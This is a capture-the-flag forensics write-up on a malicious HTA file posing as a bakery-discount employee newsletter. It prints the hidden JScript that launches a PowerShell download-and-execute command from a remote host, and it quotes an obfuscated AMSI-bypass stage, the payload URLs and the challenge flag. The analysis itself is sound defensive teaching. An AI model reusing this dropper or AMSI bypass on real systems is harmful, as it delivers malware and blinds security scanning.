# Company Discount — Forensics Writeup

**Category:** Forensics
**Difficulty:** Easy
**Author:** OddNorseman

## Challenge Description

I received an email about a new company employee discount. The attached file appeared to be an internal employee newsletter advertising a **15% discount at Brunner House Bakery**.

The challenge provides:

```text
forensics_company-discount.zip
└── Brunnerne_Employee_Discount_Newsletter_2026.hta
```

The challenge note warns that the file may trigger antivirus software and should be treated as potentially malicious.

---

## 1. Extracting the Challenge

First, extract the ZIP archive:

```bash
unzip forensics_company-discount.zip
```

Then enter the extracted directory:

```bash
cd /media/sf_kali/forensics_company-discount
```

List the files:

```bash
ls -lah
```

Output:

```text
-rwxrwx--- 1 root vboxsf 7.0K Aug 20 13:32 Brunnerne_Employee_Discount_Newsletter_2026.hta
```

Check the file type:

```bash
file Brunnerne_Employee_Discount_Newsletter_2026.hta
```

Output:

```text
Brunnerne_Employee_Discount_Newsletter_2026.hta: HTML document, ASCII text
```

Since this is an `.hta` file, I avoided executing it and instead performed static analysis.

---

## 2. Inspecting the HTA Source

The file can be inspected safely using:

```bash
cat Brunnerne_Employee_Discount_Newsletter_2026.hta
```

Most of the file contains HTML and CSS for an employee newsletter.

The visible content advertises:

> 15% OFF at Brunner House Bakery

However, at the very bottom of the file there is a suspicious JScript block:

```javascript
<script language="jscript">
    var c = "powershell.exe -w minimized /c 'iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b | iex'"; 
    new ActiveXObject('WScript.Shell').Run(c);
</script>
```

This is the actual malicious component of the challenge.

---

## 3. Understanding the Malicious Script

The script creates a `WScript.Shell` object:

```javascript
new ActiveXObject('WScript.Shell')
```

and uses it to execute:

```text
powershell.exe
```

The PowerShell command contains:

```powershell
iwr -UseBasicParsing <URL> | iex
```

Here:

* `iwr` = `Invoke-WebRequest`
* `iex` = `Invoke-Expression`
* The remote response is downloaded and then executed as PowerShell code.

The first-stage URL is:

```text
https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b
```

Instead of executing the HTA, I retrieved the payload directly for static analysis.

---

## 4. Downloading Stage 1

The first-stage payload was downloaded with:

```bash
curl -fsSL 'https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b' -o payload.txt
```

Check the file:

```bash
file payload.txt
wc -c payload.txt
```

Output:

```text
payload.txt: ASCII text
845 payload.txt
```

The payload contained heavily obfuscated PowerShell.

---

## 5. Analyzing the PowerShell Payload

The beginning of the payload looked like:

```powershell
$international = [mANaGemeNT.AUTomATION.psREFeREnCe]
$cash = $international."aSSeMbLy"
$flow = $cash.gEttYpe("SY"+"s"+"teM."+"maNAg"+"E"+"MeNt."+"a"+"UToma"+"t"+"iON.a"+"MSI"+"UTIL"+"s" , $false, $true)
```

The inconsistent capitalization and string concatenation are signs of obfuscation.

The code eventually constructs the following .NET type:

```text
System.Management.Automation.AmsiUtils
```

It then accesses:

```text
amsiInitFailed
```

and sets it to:

```powershell
$true
```

The relevant operation is:

```powershell
$lead.setVaLUE($null,$true)
```

This is an **AMSI bypass** technique.

### Why?

AMSI (Antimalware Scan Interface) allows security products to inspect PowerShell content.

By modifying the internal `AmsiUtils` state and setting `amsiInitFailed` to `true`, the script attempts to make AMSI believe initialization failed, reducing the ability of AMSI to inspect subsequent PowerShell code.

---

## 6. Finding the Second-Stage URL

At the end of the first-stage payload we find:

```powershell
$follower = iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7
```

This reveals another payload URL:

```text
https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7
```

Again, I downloaded it without executing it:

```bash
curl -fsSL 'https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7' -o payload2.txt
```

---

## 7. Extracting the Flag

Check the second-stage payload:

```bash
file payload2.txt
wc -c payload2.txt
cat payload2.txt
```

Output:

```text
payload2.txt: ASCII text, with no line terminators
58 payload2.txt
```

The content is simply:

```text
brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}
```

## Flag

```text
brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}
```

---

## Attack Chain

The complete execution chain is:

```text
Brunnerne_Employee_Discount_Newsletter_2026.hta
                │
                ▼
        WScript.Shell
                │
                ▼
          PowerShell
                │
                ▼
       Invoke-WebRequest
                │
                ▼
       Stage 1 Payload
                │
                ▼
          AMSI Bypass
                │
                ▼
       Stage 2 Payload
                │
                ▼
              FLAG
```

---

## Key Indicators of Compromise

### Malicious File

```text
Brunnerne_Employee_Discount_Newsletter_2026.hta
```

### Stage 1 URL

```text
https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b
```

### Stage 2 URL

```text
https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7
```

### Techniques Observed

* Malicious HTA
* `WScript.Shell`
* PowerShell execution
* `Invoke-WebRequest`
* `Invoke-Expression`
* PowerShell obfuscation
* AMSI bypass
* Multi-stage payload delivery

---

## Takeaways

The important lesson from this challenge is that a file doesn't need to look malicious to be dangerous.

The HTA initially appeared to be nothing more than a legitimate-looking employee newsletter. The malicious behavior was hidden at the bottom of the HTML inside a JScript block.

The safest approach was therefore:

1. **Do not execute the HTA.**
2. Identify the file type.
3. Inspect the source statically.
4. Identify the PowerShell command.
5. Extract the remote URLs.
6. Download the stages without executing them.
7. Analyze each stage until reaching the final payload.

This eventually led to the flag:

```text
brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}
```
